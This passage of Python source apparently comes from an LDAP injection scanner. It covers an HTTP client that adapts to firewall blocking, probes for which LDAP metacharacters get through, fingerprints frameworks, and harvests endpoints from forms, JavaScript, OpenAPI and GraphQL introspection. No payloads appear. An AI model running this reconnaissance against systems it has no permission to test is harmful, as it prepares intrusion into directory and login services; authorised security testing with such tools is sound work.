                self._handle_waf_response(resp.status_code, resp.text[:1000])
                
                # 4. Update lockout guard on auth failure
                if resp.status_code in (401, 403) or AUTH_FAIL_RE.search(resp.text):
                    self.lockout_guard.mark_failure(url)
                    
                return resp
                
            except requests.exceptions.RequestException as e:
                verbose(f"HTTP Error: {url} -> {str(e)}")
                return None
        finally:
            # ENHANCEMENT #7: Always release per-host limiter
            host_limiter.release()

    def _handle_waf_response(self,
                              status: int,
                              body: str = "") -> None:
        """Adapt rate limiting on WAF signals."""
        if status in (403, 406, 429):
            with self._tlock:
                self._waf_delay = min(self._waf_delay + 0.4, 3.0)
                self._waf_count += 1
                self._waf_detected = True
            # Detect WAF name from body
            if not self._waf_name:
                for name, pat in WAF_SIGS:
                    if pat.search(body):
                        self._waf_name = name
                        break
            verbose(f"  WAF signal: status={status} "
                    f"waf={self._waf_name} "
                    f"delay={self._waf_delay:.1f}s")
        else:
            with self._tlock:
                self._waf_count = max(0, self._waf_count - 1)

    # ── Request Methods ───────────────────────────────────────────────────────

    def _inc(self) -> None:
        with self._req_lock:
            self._req_count += 1

    def get(self, url: str,
            params: Optional[Dict] = None,
            auth_state: AuthState = AuthState.UNAUTH,
            phase: str = "discovery",
            timeout: Optional[int] = None
            ) -> Optional[requests.Response]:
        if not self._budget.acquire_for_phase(phase):
            return None
        self._inc()
        return self._send("GET", url, auth_state=auth_state, phase=phase, params=params or {})

    def post(self, url: str,
             data: Optional[Dict] = None,
             json_body: Optional[Dict] = None,
             auth_state: AuthState = AuthState.UNAUTH,
             phase: str = "injection",
             timeout: Optional[int] = None,
             follow_redirects: bool = True
             ) -> Optional[requests.Response]:
        if not self._budget.acquire_for_phase(phase):
            return None
        self._inc()
        kwargs = {"data": data} if data else {"json": json_body}
        return self._send("POST", url, auth_state=auth_state, phase=phase, 
                          follow_redirects=follow_redirects, **kwargs)

    def request(self, method: str, url: str,
                data: Optional[Dict] = None,
                json_body: Optional[Dict] = None,
                auth_state: AuthState = AuthState.UNAUTH,
                phase: str = "injection",
                timeout: Optional[int] = None
                ) -> Optional[requests.Response]:
        """Universal request dispatcher."""
        return self._send(method, url, auth_state=auth_state, phase=phase, 
                          data=data, json=json_body)

    def send_endpoint(self, ep: Endpoint,
                      data: Dict[str, str],
                      phase: str = "injection"
                      ) -> Optional[requests.Response]:
        """Send request to endpoint with given data dict and safety checks."""
        if not InjectionSafetyGuard.is_safe(ep.url, str(data)):
             verbose(f"  Safety Guard blocked potentially destructive payload to {ep.url}")
             return None
        if ep.use_json:
            return self.post(ep.url, json_body=data, auth_state=ep.auth_state, phase=phase)
        return self.request(ep.method, ep.url, data=data, auth_state=ep.auth_state, phase=phase)

    def send_header(self, ep: Endpoint,
                    header_name: str,
                    payload: str,
                    phase: str = "injection"
                    ) -> Optional[requests.Response]:
        """Wave 4: Send request with injected header value (§7.6). FIX C1.2"""
        if not InjectionSafetyGuard.is_safe(ep.url, payload):
            return None
        
        data = build_safe_data(ep.params, randomize=False)
        # Inject header by temporarily augmenting session headers
        session = self._get_session(ep.auth_state)
        old_val = session.headers.get(header_name)
        session.headers[header_name] = payload
        try:
            resp = self._send(ep.method, ep.url,
                              auth_state=ep.auth_state,
                              phase=phase, data=data)
        finally:
            if old_val is None:
                session.headers.pop(header_name, None)
            else:
                session.headers[header_name] = old_val
        return resp

    @property
    def total_requests(self) -> int:
        with self._req_lock:
            return self._req_count

    @property
    def waf_detected(self) -> bool:
        return self._waf_detected

    @property
    def waf_name(self) -> Optional[str]:
        return self._waf_name

    @property
    def session_cookies(self) -> Dict[str, str]:
        """V7: Return current session cookies for PoC generation."""
        try:
            s = self._get_session(AuthState.UNAUTH)
            return {k: v for k, v in s.cookies.items()}
        except Exception:
            return {}

# ═══════════════════════════════════════════════════════════════════════════════
# §11  PHASE 0 — TARGET INTELLIGENCE COMPONENTS
# ═══════════════════════════════════════════════════════════════════════════════

class WAFFingerprinter:
    """
    Tests which LDAP metacharacters survive WAF filtering.
    Result stored in client.survived_chars for payload selection.
    """

    def __init__(self, cfg: ScanConfig, client: HTTPClient):
        self._cfg    = cfg
        self._client = client

    def fingerprint(self) -> Set[str]:
        """
        Send each metacharacter in a probe and check if blocked.
        Returns set of characters that pass WAF filters.
        """
        survived: Set[str] = set()
        tprint(f"  {color('WAF Probe:', C.BOLD + C.BCYAN)} {color('Analyzing filters...', C.DIM)}")
        
        for ch in LDAP_METACHAR_SET:
            payload = f"probe{ch}test"
            resp    = self._client.post(
                self._cfg.target,
                data={"username": payload},
                phase="discovery",
            )
            if resp is None:
                # Assume character survives (conservative)
                survived.add(ch)
                tprint(f"    {color('passed ', C.GREEN)} {color(ch, C.BOLD)} {color('(timeout)', C.DIM)}")
                continue
                
            blocked = (
                resp.status_code in (403, 406, 429)
                or any(wp.search(resp.text or "")
                       for _, wp in WAF_SIGS)
            )
            if not blocked:
                survived.add(ch)
                tprint(f"    {color('passed ', C.GREEN)} {color(ch, C.BOLD)}")
            else:
                tprint(f"    {color('blocked', C.BRED)} {color(ch, C.BOLD)}")

        result = survived if survived else set(LDAP_METACHAR_SET)
        self._client._survived_chars = result
        info(f"WAF fingerprint: {len(result)}/{len(LDAP_METACHAR_SET)} metacharacters pass")
        return result



class NetworkJitterCalibrator:
    """
    Measures network jitter to calibrate timing detection thresholds.
    Uses 8 samples — sufficient for Welch t-test statistical power.
    Runs over a raw session to avoid counting against budget.
    """

    _SAMPLES = 8

    def __init__(self, cfg: ScanConfig):
        self._cfg = cfg

    def calibrate(self) -> Optional[float]:
        """
        Returns calibrated z_min threshold for timing anomaly detection.
        Returns None if jitter is too high (timing detection disabled).
        """
        times: List[float] = []
        # Build a raw session that bypasses budget tracking
        raw_session = requests.Session()
        raw_session.verify = self._cfg.verify_ssl
        if self._cfg.proxy:
            raw_session.proxies = {
                "http": self._cfg.proxy,
                "https": self._cfg.proxy,
            }

        try:
            for i in range(self._SAMPLES):
                try:
                    r = raw_session.get(
                        self._cfg.target,
                        timeout=min(self._cfg.timeout, 5),
                        verify=self._cfg.verify_ssl,
                        allow_redirects=True,
                    )
                    times.append(r.elapsed.total_seconds())
                except Exception:
                    pass
                time.sleep(0.05)
                # Early exit if stable
                if i >= 4 and len(times) >= 4:
                    med = statistics.median(times)
                    mad = statistics.median(
                        [abs(t - med) for t in times])
                    cv  = (1.4826 * mad) / max(med, 0.001)
                    if cv < 0.04:
                        verbose(f"  Jitter: stable after {i+1} samples")
                        break
        finally:
            raw_session.close()

        if len(times) < 4:
            return self._cfg.timing_z_min

        med     = statistics.median(times)
        mad     = statistics.median([abs(t - med) for t in times])
        jitter  = (1.4826 * mad) / max(med, 0.001)

        if jitter < 0.05:
            z_min = 2.5
        elif jitter < 0.15:
            z_min = 3.0
        elif jitter < 0.30:
            z_min = 4.0
        else:
            warn(f"  High network jitter ({jitter:.2f}) — "
                 f"timing detection disabled")
            return None

        info(f"  Jitter calibration: jitter={jitter:.3f} "
             f"→ z_min={z_min} ({len(times)} samples)")
        return z_min


class FrameworkDetector:
    """
    Detects backend framework and LDAP library from HTTP responses.
    Feeds server-specific payload selection.
    """

    _SIGS: List[Tuple[str, str, re.Pattern]] = [
        ("spring",  "header", re.compile(
            r"X-Application-Context|spring|whitelabel", re.I)),
        ("spring",  "body",   re.compile(
            r"Whitelabel Error Page|Spring Boot|"
            r"org\.springframework", re.I)),
        ("aspnet",  "header", re.compile(
            r"X-Powered-By:\s*ASP\.NET|X-AspNet-Version", re.I)),
        ("aspnet",  "body",   re.compile(
            r"__VIEWSTATE|__EVENTVALIDATION|System\.Web", re.I)),
        ("aspnet",  "cookie", re.compile(
            r"ASP\.NET_SessionId", re.I)),
        ("express", "header", re.compile(
            r"X-Powered-By:\s*Express", re.I)),
        ("django",  "header", re.compile(
            r"csrftoken|django", re.I)),
        ("django",  "body",   re.compile(
            r"Django.*Debug|Page not found.*Django", re.I)),
        ("shiro",   "cookie", re.compile(
            r"rememberMe=", re.I)),
        ("shiro",   "body",   re.compile(
            r"org\.apache\.shiro|ShiroFilter", re.I)),
        ("php",     "header", re.compile(
            r"X-Powered-By:\s*PHP", re.I)),
        ("iis",     "header", re.compile(
            r"Server:\s*Microsoft-IIS", re.I)),
    ]

    @classmethod
    def detect(cls, resp: requests.Response) -> Dict[str, Any]:
        """Detect framework from HTTP response."""
        scores: Dict[str, int] = {}
        headers_raw = "\n".join(
            f"{k}: {v}" for k, v in resp.headers.items())
        body_trunc  = (resp.text or "")[:6000]
        cookies_raw = "; ".join(
            f"{k}={v}" for k, v in resp.cookies.items())

        for fw, source, pat in cls._SIGS:
            target = {
                "header": headers_raw,
                "body":   body_trunc,
                "cookie": cookies_raw,
            }.get(source, "")
            if pat.search(target):
                scores[fw] = scores.get(fw, 0) + 1

        if not scores:
            return {
                "framework":  "generic",
                "confidence": 0,
            }
        top = max(scores, key=lambda k: scores[k])
        return {
            "framework":  top,
            "confidence": min(scores[top] * 30, 100),
            "all_scores": scores,
        }

# ═══════════════════════════════════════════════════════════════════════════════
# §12  PHASE 1 — DISCOVERY ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

class EndpointRiskRanker:
    """
    Scores and ranks endpoints by LDAP injection probability.
    Higher score = scan first.
    """

    _METHOD_SCORE = {
        "POST":   10,
        "PUT":    8,
        "PATCH":  7,
        "DELETE": 6,
        "GET":    5,
    }

    _PARAM_HIGH = frozenset([
        "username", "user", "uid", "login", "email", "mail",
        "cn", "dn", "search", "query", "filter", "ldap_filter",
        "q", "principal", "samaccountname", "userprincipalname",
        "binddn", "base", "basedn", "objectclass", "account", "id",
    ])

    @classmethod
    def score_param(cls, name: str) -> int:
        nl = name.lower()
        if nl in cls._PARAM_HIGH:
            return 4
        for kw in ("user", "login", "email", "uid", "pass",
                   "auth", "search", "query", "filter", "account",
                   "name", "dn", "cn", "ldap"):
            if kw in nl:
                return 2
        return 1

    @classmethod
    def rank(cls, eps: List[Endpoint],
             ldap_ports_open: bool = False,
             framework: str = "generic") -> List[Endpoint]:
        """Score all endpoints and return sorted list."""

        def _score(ep: Endpoint) -> float:
            ldap_sc  = ep.ldap_prob * 0.40
            param_sc = sum(
                cls.score_param(p) for p in ep.params[:4]
            ) * 0.20
            auth_bon = 20.0 if ep.is_auth_ep else 0.0
            meth_sc  = cls._METHOD_SCORE.get(
                ep.method.upper(), 5) * 0.10 * 10
            # Boost if LDAP port confirmed on same host
            net_bon  = 15.0 if ldap_ports_open else 0.0
            # Wave 3: Framework + Endpoint type boost (§4.1)
            fw_bon   = 10.0 if framework in ("spring", "aspnet", "shiro") else 0.0
            api_bon  = 12.0 if "/api/" in ep.url.lower() else 0.0
            json_bon = 8.0 if ep.use_json else 0.0
            
            return (ldap_sc + param_sc + auth_bon
                    + meth_sc + net_bon + fw_bon + api_bon + json_bon)

        for ep in eps:
            ep.priority = _score(ep)
        return sorted(eps, key=lambda e: -e.priority)


class StaticCrawler:
    """
    Crawls target for form-based endpoints.
    Produces both unauth and auth endpoint variants.
    """

    def __init__(self, cfg: ScanConfig, client: HTTPClient):
        self._cfg    = cfg
        self._client = client
        self._target = cfg.target.rstrip("/")
        self._seen:  Set[str] = set()
        self._page_html_cache: Dict[str, str] = {}   # V8: URL → HTML snippet

    def _normalise(self, url: str) -> Optional[str]:
        try:
            parsed = urlparse(urljoin(self._target, url))
            if parsed.scheme not in ("http", "https"):
                return None
            tgt = urlparse(self._target)
            if parsed.netloc.lower() != tgt.netloc.lower():
                return None
            path = parsed.path.rstrip("/") or "/"
            if STATIC_EXT_RE.search(path):
                return None
            return urlunparse((
                parsed.scheme,
                parsed.netloc.lower(),
                path, "", "", ""
            ))
        except Exception:
            return None

    def _extract_links(self, base: str,
                       html: str) -> List[str]:
        links: List[str] = []
        if _BS4_OK:
            try:
                soup = BeautifulSoup(html, "html.parser")
                for tag in soup.find_all(["a", "form", "link"]):
                    href = tag.get("href") or tag.get("action")
                    if href:
                        n = self._normalise(urljoin(base, href))
                        if n:
                            links.append(n)
            except Exception:
                pass
        # Regex fallback
        for m in re.finditer(
            r'(?:href|action)=["\']([^"\']+)["\']', html, re.I
        ):
            n = self._normalise(urljoin(base, m.group(1)))
            if n:
                links.append(n)
        return links

    def _extract_forms(self, base: str,
                       html: str) -> List[Endpoint]:
        """Extract form-based endpoints."""
        eps: List[Endpoint] = []
        if _BS4_OK:
            eps = self._extract_forms_bs4(base, html)
        if not eps:
            eps = self._extract_forms_regex(base, html)
        return eps

    def _extract_forms_bs4(self, base: str,
                            html: str) -> List[Endpoint]:
        eps: List[Endpoint] = []
        try:
            soup = BeautifulSoup(html, "html.parser")
            for form in soup.find_all("form"):
                action = form.get("action", "")
                method = form.get("method", "GET").upper()
                url    = (self._normalise(
                    urljoin(base, action)) or base)
                params = [
                    i.get("name", "").strip()
                    for i in form.find_all(
                        ["input", "select", "textarea"])
                    if i.get("name")
                ]
                params = [p for p in params if p]
                if not params:
                    continue
                is_auth = bool(
                    AUTH_EP_RE.search(urlparse(url).path)
                    or any(p.lower() in (
                        "password", "pass", "pwd", "pin")
                        for p in params)
                    # V7 FIX: Also detect forms with user+password param combo
                    # regardless of URL path (catches /account/verify, /user/check etc.)
                    or (
                        any(p.lower() in ("user","uid","username","login","email","mail","principal")
                            for p in params)
                        and any(p.lower() in ("password","pass","pwd","pin","secret","credential")
                                for p in params)
                    )
                )
                csrf: Dict[str, str] = {}
                for inp in form.find_all(
                    "input", {"type": "hidden"}
                ):
                    n, v = inp.get("name",""), inp.get("value","")
                    if n and re.search(
                        r"csrf|token|nonce", n, re.I
                    ):
                        csrf[n] = v
                # Determine default param values from form
                defaults: Dict[str, str] = {}
                for inp in form.find_all(["input","select"]):
                    n = inp.get("name","")
                    if n:
                        defaults[n] = inp.get("value","") or ""
                ep = Endpoint(
                    url=url,
                    method=method,
                    params=params,
                    source="form",
                    auth_state=AuthState.UNAUTH,
                    is_auth_ep=is_auth,
                    ldap_prob=35 if is_auth else 15,
                    use_json=False,
                    csrf_data=csrf,
                    default_params=defaults,
                    discovered_via=base,
                )
                eps.append(ep)
        except Exception:
            pass
        return eps

    def _extract_forms_regex(self, base: str,
                              html: str) -> List[Endpoint]:
        """Pure-regex form extraction fallback."""
        eps: List[Endpoint] = []
        form_re  = re.compile(
            r'<form([^>]*)>(.*?)</form>',
            re.DOTALL | re.I
        )
        input_re = re.compile(
            r'<(?:input|select|textarea)[^>]*'
            r'\bname\s*=\s*["\']([^"\']+)["\']',
            re.I
        )
        for fm in form_re.finditer(html):
            attrs     = fm.group(1)
            body      = fm.group(2)
            action_m  = re.search(
                r'action\s*=\s*["\']([^"\']*)["\']',
                attrs, re.I
            )
            method_m  = re.search(
                r'method\s*=\s*["\']([^"\']*)["\']',
                attrs, re.I
            )
            action = action_m.group(1) if action_m else ""
            method = (method_m.group(1).upper()
                      if method_m else "POST")
            if method not in (
                "GET","POST","PUT","PATCH","DELETE"
            ):
                method = "POST"
            params = [
                p.strip() for p in input_re.findall(body)
                if p.strip()
            ]
            if not params:
                continue
            url     = self._normalise(
                urljoin(base, action)) or base
            is_auth = bool(
                AUTH_EP_RE.search(urlparse(url).path)
                or any(p.lower() in (
                    "password","pass","pwd","pin")
                    for p in params)
            )
            eps.append(Endpoint(
                url=url, method=method, params=params,
                source="form_regex",
                auth_state=AuthState.UNAUTH,
                is_auth_ep=is_auth,
                ldap_prob=35 if is_auth else 15,
                discovered_via=base,
            ))
        return eps

    def _ldap_prob_from_response(self, url: str,
                                  body: str,
                                  headers: dict) -> int:
        """Score LDAP probability from page content."""
        score = 0
        path  = urlparse(url).path.lower()
        if any(kw in path for kw in (
            "/ldap","/directory","/ad/",
            "/activedirectory","/bind",
            "/sso","/login","/auth"
        )):
            score += 20
        if LDAP_ERRORS_RE.search(body):
            score += 50
        if re.search(
            r"ldap|active.?directory|openldap|"
            r"javax\.naming|NamingException|"
            r"cn=|dc=|ou=|objectClass|sAMAccountName",
            body + " ".join(
                f"{k}:{v}" for k, v in headers.items()
            ), re.I
        ):
            score += 25
        return min(score, 80)

    def crawl(self) -> Tuple[List[str], List[Endpoint]]:
        """
        Crawl target. Returns (pages_visited, endpoints_found).
        ENHANCEMENT #2: Updated for higher page limits and configurable crawl depth.
        """
        queue      = [self._target]
        self._seen = {self._target}
        pages:     List[str]      = []
        endpoints: List[Endpoint] = []
        depth_map: Dict[str, int] = {self._target: 0}

        # ENHANCEMENT #2: Use configurable page limit (was hardcoded to 60)
        page_limit = self._cfg.crawl_page_limit

        while queue and len(pages) < page_limit:
            url   = queue.pop(0)
            depth = depth_map.get(url, 0)
            if depth > self._cfg.depth:
                continue
            resp = self._client.get(
                url, phase="discovery")
            if resp is None:
                continue
            ct = resp.headers.get("Content-Type", "")
            if ("text/html" not in ct
                    and "application/json" not in ct):
                continue
            html  = resp.text or ""
            pages.append(url)
            # Extract LDAP probability from this page
            page_prob = self._ldap_prob_from_response(
                url, html, dict(resp.headers))
            # Extract endpoints
            for ep in self._extract_forms(url, html):
                ep.ldap_prob = max(ep.ldap_prob, page_prob)
                endpoints.append(ep)
            # V8: Cache HTML content for WebSocket probe
            self._page_html_cache[url] = html[:8000]
            # Queue links
            for link in self._extract_links(url, html):
                if link and link not in self._seen:
                    self._seen.add(link)
                    depth_map[link] = depth + 1
                    queue.append(link)

        info(f"  Crawl: {len(pages)} pages, "
             f"{len(endpoints)} form endpoints")

        # Fallback if nothing found
        if not endpoints:
            warn("  Crawl: 0 endpoints — activating fallback")
            endpoints = self._fallback_endpoints()

        return pages, endpoints

    def _fallback_endpoints(self) -> List[Endpoint]:
        """
        Minimal fallback when crawl finds nothing.
        Only 3 synthetic endpoints — POST, GET, API login.
        """
        parsed = urlparse(self._target)
        base   = urlunparse(parsed._replace(
            query="", fragment=""))
        eps: List[Endpoint] = [
            Endpoint(
                url=base, method="POST",
                params=["username","password","email","login","uid","mail","id","user"],
                source="fallback",
                is_auth_ep=True,
                ldap_prob=40,
                discovered_via=self._target,
            ),
            Endpoint(
                url=base, method="GET",
                params=["search","q","query","filter","cn","name","member","group","ou"],
                source="fallback",
                is_auth_ep=False,
                ldap_prob=25,
                discovered_via=self._target,
            ),
        ]
        # Probe /api/login
        api_login = urljoin(
            f"{parsed.scheme}://{parsed.netloc}", "/api/login")
        try:
            r = self._client.get(api_login, phase="discovery")
            if r and r.status_code not in (404, 410):
                eps.append(Endpoint(
                    url=api_login, method="POST",
                    params=["username","password"],
                    source="fallback",
                    is_auth_ep=True,
                    ldap_prob=45,
                    use_json=True,
                    discovered_via=self._target,
                ))
        except Exception:
            pass
        return eps


class SPAHarvester:
    """
    Advanced API harvester for SPAs.
    Features:
      - Iterative parameter probing (Discovery via Error parsing)
      - JS endpoint extraction
      - Obfuscated slug scanning
    """

    def __init__(self, cfg: ScanConfig, client: HTTPClient):
        self._cfg    = cfg
        self._client = client
        self._target = cfg.target.rstrip("/")

    def _normalise(self, path: str) -> Optional[str]:
        try:
            full   = urljoin(self._target, path)
            parsed = urlparse(full)
            if STATIC_EXT_RE.search(parsed.path):
                return None
            return urlunparse((
                parsed.scheme,
                parsed.netloc.lower(),
                parsed.path.rstrip("/") or "/",
                "","",""
            ))
        except Exception:
            return None

    def _probe_params(self, url: str) -> List[str]:
        """Iterative parameter discovery via error parsing (SPA behavior)."""
        discovered = []
        # Common LDAP/Auth keywords to seed the probe
        seeds = ["username", "user", "query", "search", "filter"]
        
        # Initial attempt with no params to trigger "missing param" error
        for _ in range(4):
            data = {p: "val" for p in discovered}
            resp = self._client.post(url, json_body=data, phase="discovery")
            if not resp: break
            
            body = resp.text or ""
            # Match patterns like: "Missing parameter 'username'", "field 'id' is required"
            m = re.search(r"(?:missing|required|expecting|provide)\s+(?:parameter|field|key|argument)\s+['\"]?([a-zA-Z0-9_\-]+)['\"]?", body, re.I)
            if m:
                p = m.group(1)
                if p not in discovered:
                    discovered.append(p)
                    continue
            break
            
        if not discovered:
            return ["search", "query", "q", "username", "filter"]
        return list(set(discovered + seeds[:2]))

    def harvest(self, pages: List[str]) -> List[Endpoint]:
        if not self._cfg.js_crawl:
            return []
        eps:      List[Endpoint] = []
        seen_url: Set[str]       = set()

        for page in pages[:15]:
            resp = self._client.get(page, phase="discovery")
            if resp is None:
                continue
            js_urls = re.findall(
                r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']',
                resp.text, re.I
            )
            for js_path in js_urls[:6]:
                js_url  = urljoin(page, js_path)
                js_resp = self._client.get(
                    js_url, phase="discovery")
                if js_resp is None:
                    continue
                js_text = js_resp.text
                paths: Set[str] = set()
                for pat in (JS_FETCH_RE, JS_API_PATH_RE):
                    for m in pat.finditer(js_text):
                        n = self._normalise(m.group(1))
                        if n:
                            paths.add(n)
                
                # Obfuscated slug scanning (UUIDs/Hashes)
                slug_m = re.findall(r'/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}|/[0-9a-f]{32}', js_text)
                for slug in slug_m:
                    n = self._normalise(slug)
                    if n: paths.add(n)

                for api_url in paths:
                    if api_url in seen_url:
                        continue
                    seen_url.add(api_url)
                    
                    is_auth = any(kw in api_url.lower() for kw in ("auth","login","user","bind","session"))
                    
                    # Perform iterative probing on high-value endpoints
                    params = self._probe_params(api_url) if is_auth else ["search","query","q","username","filter"]
                    
                    eps.append(Endpoint(
                        url=api_url, method="POST" if is_auth else "GET",
                        params=params,
                        source="js_harvested",
                        ldap_prob=45 if is_auth else 15,
                        use_json=True,
                        is_auth_ep=is_auth,
                        discovered_via=js_url,
                    ))

        if eps:
            info(f"  SPA harvest: {len(eps)} API endpoints (probed={sum(1 for e in eps if e.is_auth_ep)})")
        return eps


class APISpecHarvester:
    """Harvests endpoints from OpenAPI/Swagger/WADL specs."""

    _SPEC_PATHS = [
        "/swagger.json", "/swagger.yaml",
        "/openapi.json", "/openapi.yaml",
        "/api-docs", "/v2/api-docs", "/v3/api-docs",
        "/api/swagger.json",
    ]

    _LDAP_PARAM_RE = re.compile(
        r"uid|username|login|cn|dn|ldap|directory|"
        r"search|filter|sAMAccountName|email|"
        r"principal|credential|account",
        re.I,
    )

    def __init__(self, cfg: ScanConfig, client: HTTPClient):
        self._cfg    = cfg
        self._client = client

    def harvest(self) -> List[Endpoint]:
        if not self._cfg.apispec_harvest:
            return []
        for path in self._SPEC_PATHS:
            url  = urljoin(self._cfg.target, path)
            resp = self._client.get(url, phase="discovery")
            if resp and resp.status_code == 200:
                try:
                    spec = json.loads(resp.text)
                    eps  = self._parse_openapi(spec)
                    if eps:
                        info(f"  APISpec: {len(eps)} endpoints "
                             f"from {path}")
                        return eps
                except Exception:
                    pass
        return []

    def _parse_openapi(self, spec: Dict) -> List[Endpoint]:
        eps: List[Endpoint] = []
        servers = spec.get("servers", [])
        base    = (servers[0].get("url", self._cfg.target)
                   if servers else self._cfg.target)
        for path, methods in spec.get("paths", {}).items():
            for method, op in methods.items():
                if method.upper() not in (
                    "GET","POST","PUT","PATCH","DELETE"
                ):
                    continue
                params: List[str] = []
                for p in (op.get("parameters") or []):
                    name = p.get("name","")
                    if name and self._LDAP_PARAM_RE.search(name):
                        params.append(name)
                if not params:
                    params = ["q","search","username","filter"]
                full_url = urljoin(base, path)
                eps.append(Endpoint(
                    url=full_url,
                    method=method.upper(),
                    params=list(dict.fromkeys(params)),
                    source="openapi_spec",
                    ldap_prob=20,
                    discovered_via=path,
                ))
        return eps


class GraphQLHarvester:
    """
    ENHANCEMENT #9: GraphQL introspection and mutation discovery.
    Queries GraphQL endpoints for schema and extracts mutation fields with string arguments.
    These are LDAP injection candidates in GraphQL-backed LDAP APIs.
    """

    _GRAPHQL_PATHS = [
        "/graphql",
        "/api/graphql",
        "/query",
        "/graphql/query",
        "/api/v1/graphql",
        "/api/v2/graphql",
        "/graph",
        "/gql",
    ]

    # GraphQL introspection query — V7: introspects both queryType and mutationType
    _INTROSPECTION_QUERY = """
    query IntrospectionQuery {
      __schema {
        queryType {
          fields {
            name
            args {
              name
              type {
                kind
                name
                ofType {
                  kind
                  name
                }
              }
            }
          }
        }
        mutationType {
          fields {
            name
            args {
              name
              type {
                kind
                name
                ofType {
                  kind
                  name
                }
              }
            }
          }
        }
      }
    }
    """

    def __init__(self, cfg: ScanConfig, client: HTTPClient):
        self._cfg    = cfg
        self._client = client

    def harvest(self) -> List[Endpoint]:
        """Try to harvest GraphQL mutations from available endpoints."""
        for path in self._GRAPHQL_PATHS:
            url  = urljoin(self._cfg.target, path)
            eps  = self._try_introspect(url)
            if eps:
                info(f"  GraphQL: {len(eps)} mutation endpoints from {path}")
                return eps
        return []

    def _try_introspect(self, url: str) -> List[Endpoint]:
        """Send introspection query and parse mutations."""
        try:
            payload = {"query": self._INTROSPECTION_QUERY}
            resp = self._client.post(url, json_body=payload, phase="discovery")

            if not resp or resp.status_code != 200:
                return []

            data = json.loads(resp.text)
            schema = data.get("data", {}).get("__schema", {})
            eps: List[Endpoint] = []

            # V7 FIX: Process both mutations AND queries (many LDAP-backed GQL
            # APIs expose auth via query { login(...) } not mutations)
            for op_type, is_mutation in [("mutationType", True), ("queryType", False)]:
                op_schema = schema.get(op_type, {})
                if not op_schema:
                    continue
                fields = op_schema.get("fields", [])

                for field in fields:
                    field_name = field.get("name", "")
                    args = field.get("args", [])

                    # Auth-related field detection
                    is_auth_field = any(kw in field_name.lower()
                                        for kw in ("login","auth","sign","bind","token","session","user"))

                    string_args = [
                        arg.get("name", "")
                        for arg in args
                        if self._is_string_type(arg.get("type", {}))
                        and arg.get("name", "")
                    ]

                    if string_args:
                        src = "graphql_mutation" if is_mutation else "graphql_query"
                        eps.append(Endpoint(
                            url=url,
                            method="POST",
                            params=string_args,
                            source=src,
                            ldap_prob=45 if is_auth_field else 25,
                            use_json=True,
                            is_auth_ep=is_auth_field,
                            discovered_via=f"{op_type}:{field_name}",
                            context_type="graphql",
                        ))

            return eps

        except Exception:
            return []

    def _is_string_type(self, type_obj: Dict) -> bool:
        """Check if type is or wraps String type."""
        if not isinstance(type_obj, dict):
            return False
        
        # Direct String type
        if type_obj.get("name") == "String":
            return True
        
        # Wrapped in NonNull
        if type_obj.get("kind") == "NON_NULL":
            return self._is_string_type(type_obj.get("ofType", {}))
        
        # Wrapped in List
        if type_obj.get("kind") == "LIST":
            return self._is_string_type(type_obj.get("ofType", {}))
        
        return False


class DiscoveryFileHarvester:
    """
    Passive endpoint discovery via structural files.
    Targets robots.txt, sitemap.xml, security.txt, and .env leaks.
    """

    _PATHS = [
        "/sitemap.xml", "/sitemap_index.xml",
        "/robots.txt", "/security.txt", "/.well-known/security.txt"
    ]

    def __init__(self, cfg: ScanConfig, client: HTTPClient):
        self._cfg    = cfg
        self._client = client

    def harvest(self) -> List[str]:
        if not self._cfg.sitemap_harvest:
            return []
        
        target_netloc = urlparse(self._cfg.target).netloc.lower()
        urls: List[str] = []
        
        for path in self._PATHS:
            full = urljoin(self._cfg.target, path)
            resp = self._client.get(full, phase="discovery")
            if resp is None or resp.status_code != 200:
                continue
            text = resp.text or ""
            
            if "sitemap" in path:
                for m in re.finditer(r"<loc>\s*(https?://[^\s<]+)\s*</loc>", text, re.I):
                    urls.append(m.group(1).strip())
            elif "robots" in path:
                for line in text.splitlines():
                    if line.lower().startswith(("allow:","disallow:")):
                        parts = line.split(":", 1)
                        if len(parts) == 2:
                            p = parts[1].strip()
                            if p and p != "/" and "*" not in p:
                                urls.append(urljoin(self._cfg.target, p))
            elif "security" in path:
                # Extract any Contact: or hire-me: links as potential endpoints
                # Fix 3: Added domain filter to prevent external injections via security.txt
                for m in re.finditer(r"https?://[^\s]+", text):
                    raw_url = m.group(0).rstrip(".,;)")
                    if urlparse(raw_url).netloc.lower() == target_netloc:
                        urls.append(raw_url)
                    else:
                        verbose(f"  Security.txt: skipping external URL {raw_url}")
                    
        return list(dict.fromkeys(urls))


class EndpointNormalizer:
    """Deduplicates endpoints by (method, path, content-type, auth_state)."""

    @staticmethod
    def normalize(eps: List[Endpoint]) -> List[Endpoint]:
        seen: Dict[str, Endpoint] = {}
        for ep in eps:
            p  = urlparse(ep.url)
            ct = "json" if ep.use_json else "form"
            k  = (f"{ep.method.upper()}:"
                  f"{p.netloc.lower()}"
                  f"{(p.path.rstrip('/') or '/').lower()}"
                  f":{ct}:{ep.auth_state.value}")
            if k in seen:
                ex = seen[k]
                ex.params    = list(dict.fromkeys(
                    ex.params + ep.params))[:12]
                ex.ldap_prob = max(ex.ldap_prob, ep.ldap_prob)
                ex.is_auth_ep= ex.is_auth_ep or ep.is_auth_ep
            else:
                seen[k] = ep
        return list(seen.values())

    @staticmethod
    def clone_for_auth(eps: List[Endpoint]) -> List[Endpoint]:
        """
        Clone each endpoint into unauth + auth variants.
        Auth variants only added when client has auth session available.
        """
        cloned: List[Endpoint] = []
        for ep in eps:
            # Unauth variant always added
            ep.auth_state = AuthState.UNAUTH
            cloned.append(ep)
            # Auth variant
            import copy
            auth_ep           = copy.deepcopy(ep)
            auth_ep.auth_state = AuthState.AUTH
            cloned.append(auth_ep)
        return cloned
# ═══════════════════════════════════════════════════════════════════════════════
# §13  PHASE 2 — DUAL-STATE BASELINE COLLECTION
# ═══════════════════════════════════════════════════════════════════════════════

class VolatilityClassifier:
    """
    Classifies baseline response stability from sample variance.
    Drives all diff thresholds throughout the detection pipeline.
    """

    @staticmethod
    def classify(len_samples: List[int]) -> VolatilityClass:
        """Categorize endpoint volatility based on length variance (v3.0)."""
        if len(len_samples) < 2:
            return VolatilityClass.STATIC
        
        # IQR-based outlier removal before computing variance
        s = sorted(len_samples)
        q1, q3 = s[len(s)//4], s[3*len(s)//4]
        iqr = q3 - q1
        clean = [x for x in s if (q1 - 1.5*iqr) <= x <= (q3 + 1.5*iqr)] or s
